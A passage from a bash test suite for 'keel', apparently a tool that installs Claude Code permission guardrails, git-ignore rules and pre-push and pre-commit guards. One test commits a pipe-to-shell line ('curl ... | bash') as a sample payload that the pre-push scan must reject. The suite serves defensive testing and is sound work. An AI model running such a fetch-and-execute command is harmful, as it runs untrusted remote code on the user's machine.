l=json.load(open('$d2/.claude/settings.local.json'))
sys.exit(0 if ('someone-elses@thing' in s.get('enabledPlugins',{})
            and s['permissions']['deny']
            and 'Bash(npm test:*)' in l['permissions']['allow']
            and l['permissions']['defaultMode']=='bypassPermissions') else 1)" 2>/dev/null \
  && ok "merging guardrails preserves existing settings and allow rules" \
  || bad "guardrails" "merge lost pre-existing settings"

# Re-running must not accumulate duplicates: doctor compares against the same lists.
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
p=json.load(open('$d2/.claude/settings.json'))['permissions']
sys.exit(0 if len(p['deny'])==len(set(p['deny'])) and len(p['ask'])==len(set(p['ask'])) else 1)" 2>/dev/null \
  && ok "re-running init does not duplicate guardrails" \
  || bad "guardrails" "duplicate rules after a second init"

# doctor must notice both ways the design can be broken after the fact.
# Capture doctor's output rather than piping it: doctor exits non-zero by design when it finds a
# problem, and under `set -o pipefail` that status is what the pipeline returns, not grep's. Piping
# here silently inverts the test, which is the failure this comment exists to stop recurring.
d3="$(fixture node-ts)"
( cd "$d3" && "$KEEL" init -y >/dev/null 2>&1 )
printf '{ "permissions": { "deny": [], "ask": [] } }\n' > "$d3/.claude/settings.json"
out="$( cd "$d3" && "$KEEL" doctor 2>&1 )"
case "$out" in *"permission guardrail(s) missing"*) ok "doctor fails when the guardrails have been removed" ;;
  *) bad "guardrails" "doctor did not notice missing guardrails" ;; esac

# The global excludes file is neutralised because a developer's global gitignore may already cover
# `.claude/settings.local.json`, as this author's does. Without that, emptying the repository's
# .gitignore leaves the file still ignored, the check still passes, and the test proves nothing
# about the line keel writes. It is the repository's own .gitignore that has to protect a
# teammate who has no such global rule.
d4="$(fixture node-ts)"
( cd "$d4" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
out="$( cd "$d4" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"not git-ignored"*) ok "doctor fails when the local settings file would be committed" ;;
  *) bad "guardrails" "doctor did not notice a committable settings.local.json" ;; esac

# And the positive case, isolated the same way: the line keel writes must do the job alone.
d5="$(fixture node-ts)"
( cd "$d5" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d5" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is git-ignored"*) ok "the .gitignore line keel writes ignores the file on its own" ;;
  *) bad "guardrails" "keel's own .gitignore line did not ignore the local settings file" ;; esac
rm -rf "$d5"
rm -rf "$d" "$d2" "$d3" "$d4"

# ---- the handoff stays out of git -----------------------------------------
# The same three properties as the local settings file, for the same reason: a file the tooling
# writes into a working tree gets committed by the next `git add -A` unless a rule stops it. The
# handoff is session state, stale the moment work resumes, and it has reached a commit twice.
d6="$(fixture node-ts)"
( cd "$d6" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d6" && git check-ignore -q .keel/handoff.md ) \
  && ok "init git-ignores the handoff file" \
  || bad "handoff" ".keel/handoff.md is not ignored"

# The seen-marker moved out of the tree (hooks/session-start writes it under $TMPDIR now), so it
# never reaches the working tree and needs no rule of its own. A stray line would just be dead
# weight, and its reappearance would mean the marker regressed back into the tree.
if grep -qxF ".keel/handoff.seen" "$d6/.gitignore" 2>/dev/null; then
    bad "handoff" "init still writes a .gitignore rule for .keel/handoff.seen, which no longer lives in the tree"
else
    ok "init does not write a .gitignore rule for the out-of-tree seen marker"
fi

# Isolated from a developer's global excludes, as above: the repository's own line has to do the job
# for a teammate who has no such global rule.
d7="$(fixture node-ts)"
( cd "$d7" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d7/.keel/handoff.md"
out="$( cd "$d7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is git-ignored"*) ok "the .gitignore line keel writes ignores the handoff on its own" ;;
  *) bad "handoff" "keel's own .gitignore line did not ignore the handoff" ;; esac

# A handoff already in the index is the case the ignore line cannot fix on its own, and the one that
# actually happened. git check-ignore reports a tracked path as not ignored, so doctor catches both.
d8="$(fixture node-ts)"
( cd "$d8" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d8/.keel/handoff.md"
( cd "$d8" && git add -f .keel/handoff.md >/dev/null 2>&1 )
out="$( cd "$d8" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is not git-ignored"*) ok "doctor fails when the handoff file would be committed" ;;
  *) bad "handoff" "doctor did not notice a committable handoff" ;; esac

# A .gitignore whose last line has no newline terminator, which is what a real repository hands you.
# Found on the existing-service pilot: the append welded keel's rule onto the project's own last
# line, producing one line that matches nothing. It destroyed the rule that was already there and
# added neither of keel's. Both ignores are asserted because the concatenation consumes the first
# rule and drops the second, and either alone would miss half of it.
d9="$(fixture node-ts)"
printf 'node_modules/\n.claude/settings.local.json' > "$d9/.gitignore"   # deliberately unterminated
( cd "$d9" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .claude/settings.local.json ) \
  && ok "an unterminated .gitignore keeps the rule it already had" \
  || bad "handoff" "init corrupted the project's own last .gitignore line"
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .keel/handoff.md ) \
  && ok "an unterminated .gitignore still gets keel's own rules appended" \
  || bad "handoff" ".keel/handoff.md is not ignored after appending to an unterminated .gitignore"

# The check has to answer "would a teammate who clones this commit the file", not "is it ignored on
# this machine". A developer's global excludes answers the second question yes while the repository
# carries no rule at all, and doctor then reports ok on a repository that protects nobody else.
#
# This is not hypothetical: it is why the unterminated-.gitignore bug above survived a doctor run
# that said ok. The author's own ~/.gitignore covers settings.local.json, so destroying the
# repository's rule changed nothing doctor could see.
d10="$(fixture node-ts)"
( cd "$d10" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
printf '.claude/settings.local.json\n.keel/handoff.md\n' > "$d10/global-excludes"
printf '# Session handoff\n' > "$d10/.keel/handoff.md"
out="$( cd "$d10" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile \
        GIT_CONFIG_VALUE_0="$d10/global-excludes" "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the local settings file" ;;
  *) bad "guardrails" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
case "$out" in *"handoff.md is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the handoff" ;;
  *) bad "handoff" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
rm -rf "$d6" "$d7" "$d8" "$d9" "$d10"

# ---- invoked through a symlink on PATH ------------------------------------
# The documented install is a symlink into a directory on PATH. dirname does not follow symlinks,
# so before the fix HERE resolved to the symlink's directory: lib/ failed to source, VERSION fell
# back to 0.0.0, and templates were silently absent. It reported success while doing nothing.

parent="$(mktemp -d)"
ln -s "$KEEL" "$parent/keel"
real_version="$(cat "$(dirname "$KEEL")/../VERSION")"
[ "$("$parent/keel" version)" = "$real_version" ] \
  && ok "invoked through a symlink, keel finds its own VERSION" \
  || bad "symlink" "version through a symlink was not $real_version"

# init is the real proof: it needs lib/ and templates/, which is what a broken HERE loses.
proj="$parent/via-symlink"
mkdir -p "$proj" && ( cd "$proj" && git init -q . && "$parent/keel" init -y >/dev/null 2>&1 )
[ -s "$proj/docs/keel/prompting.md" ] \
  && ok "invoked through a symlink, init still reaches its templates" \
  || bad "symlink" "init through a symlink did not write the prompting cheatsheet"

# A partial install must fail loudly rather than proceed into undefined functions.
broken="$parent/broken"
mkdir -p "$broken/bin" && cp "$KEEL" "$broken/bin/keel"
out="$("$broken/bin/keel" version 2>&1)"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"incomplete install"*) ok "an incomplete install fails loudly" ;;
  *) bad "symlink" "incomplete install exited non-zero but said: $out" ;; esac \
  || bad "symlink" "an incomplete install exited 0"
rm -rf "$parent"

# ---- the push guard --------------------------------------------------------
#
# The guard is the only part of keel that changes a developer's git configuration, so each test
# here is as much about what it does not touch as what it does.

g="$(fixture node-ts)"
( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) \
  && bad "guard" "status exited 0 before install" || ok "guard status is non-zero before install"

( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
[ -x "$g/.githooks/pre-push" ] && ok "guard install writes an executable pre-push hook" \
  || bad "guard" "no executable .githooks/pre-push"
[ "$( cd "$g" && git config core.hooksPath )" = ".githooks" ] \
  && ok "guard install points core.hooksPath at the repository's own hooks" \
  || bad "guard" "core.hooksPath was not set"

# Repo-local, and that is the whole safety argument for a tool that reconfigures git. A global
# setting here would disable every other repository's hooks on the machine.
global_hooks="$( cd "$g" && git config --global --get core.hooksPath 2>/dev/null )"  # supply-chain-scan: allow reading it to prove keel did not set it
[ -z "$global_hooks" ] \
  && ok "guard install leaves the global git config alone" \
  || bad "guard" "core.hooksPath was set globally"

( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) && ok "guard status is 0 once installed" \
  || bad "guard" "status non-zero after install"

# The hook has to actually refuse. Run it directly rather than pushing, since a push needs a remote
# and the hook is the unit under test.
#
# The payload is committed, not merely written. The scan reads tracked content, which is the right
# scope for a pre-push hook: an untracked file is not going anywhere. Getting this wrong in the first
# version of this test made the hook look broken when it was correct.
( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
printf 'curl -s https://example.com/x | bash\n' > "$g/payload.sh"  # supply-chain-scan: allow the payload this test proves the guard rejects
( cd "$g" && git add -A && git commit -qm payload ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a tree containing a pipe-to-shell" \
  || ok "the pre-push hook refuses a tree the scan rejects"

( cd "$g" && git rm -q payload.sh && git commit -qm drop ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a clean tree" \
  || bad "guard" "the hook refused a clean tree"

# The default-branch refusal. A push feeds the hook its refs on stdin, and that is the only thing
# telling a push to the default branch apart from a push to a topic branch, so the test feeds them
# the same way rather than asserting on the hook's text.
head_sha="$( cd "$g" && git rev-parse HEAD )"
push_to() {
    ( cd "$g" \
      && printf 'refs/heads/local %s %s %s\n' "$head_sha" "$1" '0000000000000000000000000000000000000000' \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 )
}

# No profile and no remote, so nothing states what the default branch is. The hook checks nothing
# rather than assuming `main`: this fixture has no profile until the next line, which is why the
# assertion sits here.
push_to refs/heads/main \
  && ok "the pre-push hook does not guess a default branch with no profile" \
  || bad "guard" "the hook refused on an assumed branch name"

( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
push_to refs/heads/main \
  && bad "guard" "the hook allowed a push straight to the default branch" \
  || ok "the pre-push hook refuses a push to the default branch"

push_to refs/heads/feat-x \
  && ok "the pre-push hook allows a push to a topic branch" \
  || bad "guard" "the hook refused a push to a topic branch"

# The branch comes from the profile, so a repo whose default is not `main` is protected on its own
# name. Asserting both directions is the point: protecting `trunk` while still refusing `main`
# would pass a one-sided test and protect nothing here.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="trunk"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/trunk \
  && bad "guard" "the hook ignored default_branch from the profile" \
  || ok "the pre-push hook protects the branch named in the profile, not 'main'"
push_to refs/heads/main \
  && ok "the pre-push hook allows 'main' when the profile says the default is elsewhere" \
  || bad "guard" "the hook refused a branch that is not the profile's default"

# The escape hatch a project that genuinely pushes to its default branch needs.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="main"
d["conventions"]["protect_default_branch"]=False
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/main \
  && ok "protect_default_branch false allows the push" \
  || bad "guard" "the hook refused with protect_default_branch false"

# --- pre-push: refuses a push that loosens the profile -----------------------------------------
rt="$(fixture bare)"
( cd "$rt" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$rt" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$rt" && "$KEEL" profile set conventions.protect_default_branch false >/dev/null 2>&1 )
# init writes gates.commit_guard as "off" (`bin/keel#"commit_guard": "off"`). Without this line the baseline and the
# "loosened" commit both hold off, nothing loosens, and the refusal below can never be observed.
# Setting it to required also arms the pre-commit hook for this fixture's commits, which is harmless:
# a bare fixture has null verify.format, lint and typecheck, so the hook runs nothing.
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "baseline, gate required" )
old_sha="$( cd "$rt" && git rev-parse HEAD )"

( cd "$rt" && "$KEEL" profile set gates.commit_guard off >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "loosen the commit gate" )
new_sha="$( cd "$rt" && git rev-parse HEAD )"

out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha" "$old_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
rc=$?
[ "$rc" -ne 0 ] && ok "pre-push refuses a push that loosens gates.commit_guard" \
  || bad "guard" "pre-push allowed a push that turned gates.commit_guard from required to off"
case "$out" in
  *"gates.commit_guard"*) ok "the refusal names the loosened key" ;;
  *) bad "guard" "refusal message does not name gates.commit_guard. Got: $out" ;;
esac

# the reverse direction, tightening, is not refused
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "tighten it back" )
tight_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$tight_sha" "$new_sha" \
    | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "pre-push allows a push that tightens a gate" \
  || bad "guard" "pre-push refused a push that only tightened gates.commit_guard"

# an unrecognized value, not "required", "warn" or "off", such as a typo, must be treated as a
# loosening too. The pre-commit hook's own case statement (`bin/keel#case "$gate" in`) already
# treats anything but required/warn as fully off, so this is a real value a profile can hold, not
# a contrived one, and `keel profile set` writes it as a plain JSON string with no validation of
# its own.
( cd "$rt" && "$KEEL" profile set gates.commit_guard disabled >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "commit_guard set to an unrecognized value" )
bad_val_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bad_val_sha" "$tight_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"gates.commit_guard"*) ok "pre-push refuses gates.commit_guard set to an unrecognized value" ;;
  *) bad "guard" "gates.commit_guard set to an unrecognized string was not refused. Got: $out" ;;
esac

# restore a recognized value so the later tests in this fixture, which rely on gates.commit_guard
# being "required" going into their own comparisons, are not left resting on "disabled".
( cd "$rt" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "restore commit_guard to required" )

# a first push (remote sha all zeros) compares against the remote-tracking default branch, so a
# branch born weaker than main is refused on its first push, not only its second. The fixture has
# no real remote; a remote-tracking ref pointing at the strong baseline is all the hook reads.
( cd "$rt" && git update-ref refs/remotes/origin/main "$old_sha" )
( cd "$rt" && printf 'refs/heads/weak %s refs/heads/weak %s\n' "$new_sha" "0000000000000000000000000000000000000000" \
    | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && bad "guard" "pre-push allowed a first push of a branch whose profile is weaker than origin/main" \
  || ok "pre-push refuses a first push that is weaker than the remote default branch"

# a verify command replaced by a non-string is a loosening too, not only null. The bare fixture
# starts with verify.test null, so a string goes in first. `keel profile set` writes the literal
# `true` as a JSON boolean, not the string (`bin/keel#raw == "true":  val = True`), which is the shape the idea document names.
( cd "$rt" && "$KEEL" profile set verify.test "npm test" >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.test is a command" )
str_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && "$KEEL" profile set verify.test true >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.test is now JSON true" )
bool_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bool_sha" "$str_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"verify.test"*) ok "pre-push refuses verify.test becoming a non-string" ;;
  *) bad "guard" "verify.test turned from a string into true and the push was not refused. Got: $out" ;;
esac

# verify.security is one of the keys the original comparator left out entirely (only test, lint,
# format, typecheck, build were checked), so a real command going null there sailed through unrefused.
( cd "$rt" && "$KEEL" profile set verify.security "npm audit" >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.security is a command" )
sec_str_sha="$( cd "$rt" && git rev-parse HEAD )"
( cd "$rt" && "$KEEL" profile set verify.security null >/dev/null 2>&1 )
( cd "$rt" && git add -A && git commit -q -m "verify.security is now null" )
sec_null_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$sec_null_sha" "$sec_str_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"verify.security"*) ok "pre-push refuses verify.security going from a command to null" ;;
  *) bad "guard" "verify.security turned null and the push was not refused. Got: $out" ;;
esac

# removing a gate key outright, not just setting it to "off", is the same loosening by another
# route, and the comparator must not need the key to survive in order to notice it went missing.
python3 - "$rt" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["commit_guard"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$rt" && git add -A && git commit -q -m "remove gates.commit_guard entirely" )
gate_del_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$gate_del_sha" "$sec_null_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"gates.commit_guard"*) ok "pre-push refuses a push that removes gates.commit_guard entirely" ;;
  *) bad "guard" "removing gates.commit_guard was not refused. Got: $out" ;;
esac

# deleting .keel/profile.json entirely is the maximal loosening, every gate and verify check at
# once, and there is no new-side JSON document for the python comparator to be handed at all.
( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "delete the profile" )
del_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$del_sha" "$gate_del_sha" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"profile.json"*"deleted"*) ok "pre-push refuses a push that deletes .keel/profile.json" ;;
  *) bad "guard" "deleting .keel/profile.json was not refused. Got: $out" ;;
esac

# the first push of a brand-new branch must catch a deleted profile too, not only a second push to
# a branch the remote already has. Resolving the remote comparison point on a first push (all-zero
# remote sha) needs default_branch from the profile, and the hook read that from the working tree
# of the branch being pushed, which is exactly the file this push deletes: the fallback silently
# never ran and the deletion went unrefused. `git checkout` the new branch for real, unlike the
# other cases above, which never diverge from main and so never exercise this: default_branch has
# to come from a working tree that genuinely lacks the profile, the way a real push would leave it.
( cd "$rt" && git checkout -q -b brand-new "$gate_del_sha" )
( cd "$rt" && git update-ref refs/remotes/origin/main "$gate_del_sha" )
( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "first push of a new branch, profile gone" )
new_branch_sha="$( cd "$rt" && git rev-parse HEAD )"
out="$(cd "$rt" && printf 'refs/heads/brand-new %s refs/heads/brand-new %s\n' "$new_branch_sha" "0000000000000000000000000000000000000000" \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
case "$out" in
  *"profile.json"*"deleted"*) ok "pre-push refuses a first push of a new branch that deletes the profile" ;;
  *) bad "guard" "first push of a new branch deleting the profile was not refused. Got: $out" ;;
esac
rm -rf "$rt"

# --- pre-push: a Windows Store python3 alias must not be read as a loosening report -------------
# have_py here (bin/keel#guard_hook_body) used `command -v python3` too: the shim looked present,
# so the loosening comparator actually ran it, and its not-found message came back as $report,
# non-empty, read as though the profile had loosened. Nothing about this profile moved.
storeshim2="$(mktemp -d)"
cat > "$storeshim2/python3" <<'SHIM'
#!/bin/sh
printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
exit 49
SHIM
chmod +x "$storeshim2/python3"

pp="$(fixture bare)"
( cd "$pp" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$pp" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$pp" && "$KEEL" profile set conventions.protect_default_branch false >/dev/null 2>&1 )
( cd "$pp" && git add -A && git commit -q -m "baseline" )
old_sha2="$( cd "$pp" && git rev-parse HEAD )"
( cd "$pp" && "$KEEL" profile set project.description "unchanged gates, unrelated edit" >/dev/null 2>&1 )
( cd "$pp" && git add -A && git commit -q -m "unrelated edit, nothing loosened" )
new_sha2="$( cd "$pp" && git rev-parse HEAD )"
pp_out="$(cd "$pp" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha2" "$old_sha2" \
   | PATH="$storeshim2:$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
pp_rc=$?
[ "$pp_rc" -eq 0 ] \
  && ok "pre-push does not mistake a Store-alias python3's not-found message for a loosening report" \
  || bad "guard" "pre-push refused a push that loosened nothing, with a Store-alias python3 on PATH. Got: $pp_out"
rm -rf "$pp" "$storeshim2"

# The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and never
# parses it. Linting the generated file is the only way that code gets checked at all.
if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$g/.githooks/pre-push" >/dev/null 2>&1 \
      && ok "the generated pre-push hook is shellcheck clean" \
      || bad "guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$g/.githooks/pre-push" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated hook was not linted\n'
fi

( cd "$g" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ -z "$( cd "$g" && git config core.hooksPath 2>/dev/null )" ] \
  && ok "guard uninstall clears core.hooksPath" || bad "guard" "core.hooksPath survived uninstall"
rm -rf "$g"

# ---- the commit guard ------------------------------------------------------
#
# One install writes two hooks, and the second one is inert until the profile asks for it. That
# split is the design: a team installs the guard for the push protections, and a commit gate that
# arrived uninvited alongside them is how a tool gets uninstalled.

c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$c" && "$KEEL" guard install >/dev/null 2>&1 )

[ -x "$c/.githooks/pre-commit" ] && ok "guard install writes an executable pre-commit hook" \
  || bad "commit guard" "no executable .githooks/pre-commit"

gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['gates'].get('commit_guard'))" 2>/dev/null; }
[ "$(gate_of "$c")" = "off" ] && ok "init writes gates.commit_guard off by default" \
  || bad "commit guard" "gates.commit_guard is '$(gate_of "$c")', want 'off'"

# Off is off, and this fixture proves it rather than asserting it: its lint is `eslint .`, which is
# not installed here, so a hook that read the gate wrongly would fail on this line.
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the pre-commit hook is inert while gates.commit_guard is off" \
  || bad "commit guard" "the hook ran its checks with the gate off"

# The remedy the refusal has to name. Set before the gate so the first refusal already carries it.
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 2' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format_fix 'npm run format' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )

( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && bad "commit guard" "the hook allowed a commit past a failing verify command" \
  || ok "the pre-commit hook refuses when a verify command fails"

out="$( cd "$c" && .githooks/pre-commit 2>&1 )"
case "$out" in *"npm run format"*) ok "the refusal names verify.format_fix as the remedy" ;;
  *) bad "commit guard" "the refusal did not name format_fix" ;; esac
case "$out" in *"--no-verify"*) ok "the refusal names the escape hatch" ;;
  *) bad "commit guard" "the refusal did not name --no-verify" ;; esac

# It checks and never rewrites. A hook that reformatted the tree would put content into a commit
# its author never read, which is the reason this gate refuses instead of fixing.
before="$( cd "$c" && git status --porcelain )"
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 )
[ "$( cd "$c" && git status --porcelain )" = "$before" ] \
  && ok "the refusing hook leaves the working tree alone" \
  || bad "commit guard" "the hook modified the tree"

( cd "$c" && "$KEEL" profile set gates.commit_guard warn >/dev/null 2>&1 )
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "warn reports the failure and allows the commit" \
  || bad "commit guard" "warn refused the commit"

# Passing commands, and the two shapes doctor also refuses to run: a null command and a templated
# one, neither of which can be executed as written.
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 1' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.lint 'eslint {path}' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.typecheck null >/dev/null 2>&1 )
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the hook skips null and templated commands and allows the commit" \
  || bad "commit guard" "the hook ran a null or templated command"

# Intermittent, not yet root caused: this assertion has failed a handful of times in a full suite
# run and never once standalone or in a fixture built fresh for just this case, which rules out the
# assertion and the command it checks. Carries its own evidence on failure rather than a bare "it
# said nothing", so the next occurrence is diagnosable instead of needing to be caught live again.
gs_out="$( cd "$c" && "$KEEL" guard status 2>&1 )"
printf '%s\n' "$gs_out" | grep -qi "commit guard" \
  && ok "guard status reports the commit guard as well as the push guard" \
  || bad "commit guard" "status said nothing about the commit guard. Got: [$gs_out] core.hooksPath=[$( cd "$c" && git config core.hooksPath 2>/dev/null )] fixture=[$c]"

if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$c/.githooks/pre-commit" >/dev/null 2>&1 \
      && ok "the generated pre-commit hook is shellcheck clean" \
      || bad "commit guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$c/.githooks/pre-commit" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated pre-commit hook was not linted\n'
fi

# --- pre-commit: a Windows Store python3 alias must be treated as absent, not present -----------
# `if ! command -v python3` (bin/keel#guard_precommit_body) only checked PATH, so the shim passed
# it, and the gate value read back from `field()` was the shim's not-found message instead of
# "required", which fell through the hook's own case statement to the catch-all "not a value the
# hook knows about, exit 0" with no explanation printed. A required gate went unchecked silently.
storeshim3="$(mktemp -d)"
cat > "$storeshim3/python3" <<'SHIM'
#!/bin/sh
printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
exit 49
SHIM
chmod +x "$storeshim3/python3"

pc="$(fixture bare)"
( cd "$pc" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$pc" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$pc" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
pc_out="$( cd "$pc" && PATH="$storeshim3:$PATH" .githooks/pre-commit 2>&1 )"
case "$pc_out" in
  *"python3 is absent"*) ok "the pre-commit guard reports python3 as absent for a Store-alias shim, rather than silently skipping" ;;
  *) bad "commit guard" "a required gate went unchecked with no explanation printed. Got: $pc_out" ;;
esac
rm -rf "$pc" "$storeshim3"

( cd "$c" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$c/.githooks/pre-commit" ] && ok "guard uninstall removes the pre-commit hook too" \
  || bad "commit guard" "the pre-commit hook survived uninstall"
rm -rf "$c"

# --- guard install: prepare-commit-msg appends Keel-Version -----------------------------------
tv="$(fixture bare)"
( cd "$tv" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$tv" && "$KEEL" guard install >/dev/null 2>&1 )
[ -x "$tv/.githooks/prepare-commit-msg" ] && ok "guard install writes an executable prepare-commit-msg hook" \
  || bad "guard" "no executable .githooks/prepare-commit-msg"

( cd "$tv" && "$KEEL" guard status 2>&1 | grep -qi "message guard" ) \
  && ok "guard status reports the message guard as well as the push and commit guards" \
  || bad "guard" "status said nothing about the message guard"

